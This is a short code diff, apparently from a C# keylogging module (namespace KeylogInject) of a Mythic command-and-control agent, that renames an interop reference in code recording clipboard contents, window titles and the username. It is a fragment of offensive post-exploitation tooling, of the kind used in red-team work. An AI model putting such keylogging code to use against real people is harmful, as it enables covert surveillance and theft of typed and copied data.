@@ -49,7 +49,7 @@ namespace KeylogInject
                         {
                             lastClipboard = clipboardMessage;
                             lastWindow = curWindow;
-                            LogMessage(new ApolloInterop.Structs.MythicStructs.KeylogInformation
+                            LogMessage(new AgInterop.Structs.MythicStructs.KeylogInformation
                             {
                                 Username = _username,
                                 WindowTitle = sb.ToString(),
